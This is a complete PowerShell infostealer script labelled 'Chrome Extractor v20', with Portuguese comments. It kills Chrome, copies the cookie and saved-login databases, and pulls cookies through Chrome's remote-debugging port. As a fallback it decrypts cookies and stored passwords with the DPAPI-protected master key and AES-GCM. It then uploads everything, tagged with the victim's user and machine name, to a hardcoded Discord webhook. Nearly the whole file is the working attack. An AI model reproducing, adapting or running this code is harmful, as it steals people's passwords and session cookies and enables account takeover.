param($w="https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSYIM3PU7f2_WLzAOIu6kDPwd45adNZdkGd8jMoutFQP1Ol-P9")

$d = Get-Date -Format "HH:mm:ss"
Write-Host "[$d] Chrome Extractor v20"
Write-Host "[$d] User: $env:USERNAME@$env:COMPUTERNAME"

# Mata Chrome
Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 2

# Prepara diretorio
$outDir = "$env:TEMP\chrome_extracted"
if (!(Test-Path $outDir)) { New-Item -ItemType Directory -Path $outDir -Force | Out-Null }

# Copia Local State
$state = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
Copy-Item $state "$outDir\Local State" -Force -ErrorAction SilentlyContinue

# Copia bancos de dados
$cu = "$env:LOCALAPPDATA\Google\Chrome\User Data"
foreach ($pr in @('Default','Profile 1','Profile 2')) {
    $c1 = "$cu\$pr\Cookies"
    $c2 = "$cu\$pr\Network\Cookies"
    $ld = "$cu\$pr\Login Data"
    if (Test-Path $c1) { Copy-Item $c1 "$outDir\$pr-Cookies" -Force -ErrorAction SilentlyContinue }
    if (Test-Path $c2) { Copy-Item $c2 "$outDir\$pr-Network-Cookies" -Force -ErrorAction SilentlyContinue }
    if (Test-Path $ld) { Copy-Item $ld "$outDir\$pr-Login_Data" -Force -ErrorAction SilentlyContinue }
}
Write-Host "[$d] Bancos copiados"

# Tenta Chrome Debug
Write-Host "[$d] Tentando Chrome Remote Debug..."
$tmpProfile = "$env:TEMP\chromedbg_$([System.IO.Path]::GetRandomFileName())"
New-Item -ItemType Directory -Path $tmpProfile -Force | Out-Null
Copy-Item $state "$tmpProfile\Local State" -Force -ErrorAction SilentlyContinue
foreach ($pr2 in @('Default','Profile 1')) {
    $sd = "$cu\$pr2"
    $dd = "$tmpProfile\$pr2"
    if (Test-Path $sd) {
        New-Item -ItemType Directory -Path $dd -Force -ErrorAction SilentlyContinue | Out-Null
        foreach ($f in @('Cookies','Cookies-journal','Login Data','Login Data-journal')) {
            $sf = Join-Path $sd $f
            $df = Join-Path $dd $f
            if (Test-Path $sf) { Copy-Item $sf $df -Force -ErrorAction SilentlyContinue }
        }
    }
}

$ce = "$env:ProgramFiles\Google\Chrome\Application\chrome.exe"
if (!(Test-Path $ce)) { $ce = "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe" }
if (!(Test-Path $ce)) { $ce = "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe" }

$gotData = $false

if (Test-Path $ce) {
    $port = 9222
    $proc = Start-Process -FilePath $ce -ArgumentList "--remote-debugging-port=$port --remote-allow-origins=* --headless --user-data-dir=$tmpProfile --no-first-run --disable-features=ChromeWhatsNewUI --disable-sync --no-default-browser-check" -WindowStyle Hidden -PassThru
    Start-Sleep -Seconds 5
    
    $wsUrl = $null
    $attempts = 0
    while ($attempts -lt 15 -and !$wsUrl) {
        $attempts++
        try { $resp = Invoke-RestMethod "http://127.0.0.1:$port/json/version" -TimeoutSec 3 -ErrorAction SilentlyContinue; $wsUrl = $resp.webSocketDebuggerUrl } catch { }
        if (!$wsUrl) { try { $list = Invoke-RestMethod "http://127.0.0.1:$port/json" -TimeoutSec 3 -ErrorAction SilentlyContinue; if ($list -and $list[0]) { $wsUrl = $list[0].webSocketDebuggerUrl } } catch { } }
        Start-Sleep -Seconds 1
    }
    
    if ($wsUrl) {
        Write-Host "[$d] Chrome Debug conectado!"
        $ws = New-Object System.Net.WebSockets.ClientWebSocket
        $ws.ConnectAsync([System.Uri]$wsUrl, [System.Threading.CancellationToken]::None).Wait()
        
        $msg = '{"id":1,"method":"Network.getAllCookies"}'
        $sendBytes = [System.Text.Encoding]::UTF8.GetBytes($msg)
        $ws.SendAsync([System.ArraySegment[byte]]::new($sendBytes), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
        
        $buf = [byte[]]::new(524288)
        $res = $ws.ReceiveAsync([System.ArraySegment[byte]]::new($buf), [System.Threading.CancellationToken]::None).Result
        $respStr = [System.Text.Encoding]::UTF8.GetString($buf, 0, $res.Count)
        $ws.Dispose()
        
        $json = $respStr | ConvertFrom-Json
        if ($json.result -and $json.result.cookies -and $json.result.cookies.Count -gt 0) {
            $allCookies = $json.result.cookies
            Write-Host "[$d] Chrome Debug: $($allCookies.Count) cookies"
            $gotData = $true
            
            $cc = $allCookies | ConvertTo-Json -Depth 3
            $boundary = "----Boundary$([System.Guid]::NewGuid().ToString().Replace('-',''))"
            $payload = @"
--$boundary
Content-Disposition: form-data; name="payload_json"

{"content":"Chrome Debug | $env:USERNAME@$env:COMPUTERNAME | Cookies: $($allCookies.Count)"}
--$boundary
Content-Disposition: form-data; name="file"; filename="cookies.json"
Content-Type: application/json

$cc
--$boundary--
"@
            $payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add('Content-Type', "multipart/form-data; boundary=$boundary")
            $wc.UploadData($w, 'POST', $payloadBytes) | Out-Null
            $wc.Dispose()
            Write-Host "[$d] Enviado ao Discord!"
            
            $cc | Out-File (Join-Path $outDir "cookies.json") -Encoding UTF8
        }
    }
    
    if ($proc -and !$proc.HasExited) { $proc.Kill() }
    Start-Sleep -Seconds 1
}

if (Test-Path $tmpProfile) { Remove-Item $tmpProfile -Recurse -Force -ErrorAction SilentlyContinue }

# Se nao conseguiu pelo debug, tenta DPAPI
if (!$gotData) {
    Write-Host "[$d] Tentando DPAPI..."
    $jsonState = Get-Content $state -Raw | ConvertFrom-Json
    $encKey = $jsonState.os_crypt.encrypted_key
    
    if ($encKey) {
        $raw = [Convert]::FromBase64String($encKey)
        if ($raw[0] -eq 1 -and $raw.Length -gt 5) {
            $toDecrypt = $raw[5..($raw.Length-1)]
            $mk = [System.Security.Cryptography.ProtectedData]::Unprotect($toDecrypt, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            if ($mk -and $mk.Length -ge 32) {
                $mk = $mk[0..31]
                Write-Host "[$d] DPAPI OK!"
                
                Add-Type -AssemblyName 'Microsoft.Data.Sqlite' -ErrorAction SilentlyContinue
                
                $allCookies = @()
                $allLogins = @()
                
                foreach ($pr3 in @('Default','Profile 1')) {
                    $cdb = "$outDir\$pr3-Cookies"
                    $ldb = "$outDir\$pr3-Login_Data"
                    
                    if (Test-Path $cdb) {
                        $conn = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$cdb")
                        $conn.Open()
                        $cmd = $conn.CreateCommand()
                        $cmd.CommandText = "SELECT host_key, name, path, encrypted_value FROM cookies"
                        $reader = $cmd.ExecuteReader()
                        while ($reader.Read()) {
                            $eb = $reader['encrypted_value']
                            if ($eb -is [string]) { continue }
                            $ea = [byte[]]$eb
                            if ($ea.Length -lt 15) { continue }
                            $v = $null
                            if ($ea[0] -eq 1) {
                                $c = $ea[3..($ea.Length-1)]
                                $dc = [System.Security.Cryptography.ProtectedData]::Unprotect($c, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                                $v = [System.Text.Encoding]::UTF8.GetString($dc)
                            }
                            if ($ea[0] -eq 2 -or $ea[0] -eq 3) {
                                $n = $ea[3..14]
                                $cl = $ea.Length - 15 - 16
                                if ($cl -gt 0) {
                                    $c = $ea[15..(15+$cl-1)]
                                    $t = $ea[(15+$cl)..($ea.Length-1)]
                                    $a = [System.Security.Cryptography.AesGcm]::new($mk, 16)
                                    $r = [byte[]]::new($cl)
                                    $a.Decrypt($n, $c, $t, $r)
                                    $a.Dispose()
                                    $v = [System.Text.Encoding]::UTF8.GetString($r)
                                }
                            }
                            if ($v) { $allCookies += @{host=$reader['host_key']; name=$reader['name']; value=$v; path=$reader['path']} }
                        }
                        $reader.Close()
                        $conn.Close()
                    }
                    
                    if (Test-Path $ldb) {
                        $conn2 = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$ldb")
                        $conn2.Open()
                        $cmd2 = $conn2.CreateCommand()
                        $cmd2.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
                        $reader2 = $cmd2.ExecuteReader()
                        while ($reader2.Read()) {
                            $pb = $reader2['password_value']
                            if ($pb -is [string]) { $pb = [System.Text.Encoding]::UTF8.GetBytes($pb) }
                            if ($pb.Length -lt 15) { continue }
                            $v = $null
                            if ($pb[0] -eq 1) {
                                $c = $pb[3..($pb.Length-1)]
                                $dc = [System.Security.Cryptography.ProtectedData]::Unprotect($c, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                                $v = [System.Text.Encoding]::UTF8.GetString($dc)
                            }
                            if ($pb[0] -eq 2 -or $pb[0] -eq 3) {
                                $n = $pb[3..14]
                                $cl = $pb.Length - 15 - 16
                                if ($cl -gt 0) {
                                    $c = $pb[15..(15+$cl-1)]
                                    $t = $pb[(15+$cl)..($pb.Length-1)]
                                    $a = [System.Security.Cryptography.AesGcm]::new($mk, 16)
                                    $r = [byte[]]::new($cl)
                                    $a.Decrypt($n, $c, $t, $r)
                                    $a.Dispose()
                                    $v = [System.Text.Encoding]::UTF8.GetString($r)
                                }
                            }
                            if ($v) { $allLogins += @{url=$reader2['origin_url']; username=$reader2['username_value']; password=$v} }
                        }
                        $reader2.Close()
                        $conn2.Close()
                    }
                }
                
                Write-Host "[$d] DPAPI: $($allCookies.Count) cookies, $($allLogins.Count) logins"
                
                if ($allCookies.Count -gt 0 -or $allLogins.Count -gt 0) {
                    $gotData = $true
                    $boundary = "----Boundary$([System.Guid]::NewGuid().ToString().Replace('-',''))"
                    
                    $bodyLines = @()
                    $bodyLines += "--$boundary"
                    $bodyLines += 'Content-Disposition: form-data; name="payload_json"'
                    $bodyLines += ''
                    $bodyLines += "{\"content\":\"Chrome DPAPI | $env:USERNAME@$env:COMPUTERNAME | Cookies: $($allCookies.Count) | Logins: $($allLogins.Count)\"}"
                    
                    if ($allCookies.Count -gt 0) {
                        $cc = $allCookies | ConvertTo-Json -Depth 3
                        $bodyLines += "--$boundary"
                        $bodyLines += 'Content-Disposition: form-data; name="file"; filename="cookies.json"'
                        $bodyLines += 'Content-Type: application/json'
                        $bodyLines += ''
                        $bodyLines += $cc
                    }
                    
                    if ($allLogins.Count -gt 0) {
                        $lc = $allLogins | ConvertTo-Json -Depth 3
                        $bodyLines += "--$boundary"
                        $bodyLines += 'Content-Disposition: form-data; name="file"; filename="logins.json"'
                        $bodyLines += 'Content-Type: application/json'
                        $bodyLines += ''
                        $bodyLines += $lc
                    }
                    
                    $bodyLines += "--$boundary--"
                    $bodyStr = $bodyLines -join "`r`n"
                    $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyStr)
                    
                    $wc = New-Object System.Net.WebClient
                    $wc.Headers.Add('Content-Type', "multipart/form-data; boundary=$boundary")
                    $wc.UploadData($w, 'POST', $bodyBytes) | Out-Null
                    $wc.Dispose()
                    Write-Host "[$d] Enviado ao Discord!"
                    
                    $allCookies | ConvertTo-Json -Depth 3 | Out-File (Join-Path $outDir "cookies.json") -Encoding UTF8
                    $allLogins | ConvertTo-Json -Depth 3 | Out-File (Join-Path $outDir "logins.json") -Encoding UTF8
                }
            }
        }
    }
}

write-Host "[$d] Dados em: $outDir"
write-Host "[$d] CONCLUIDO"
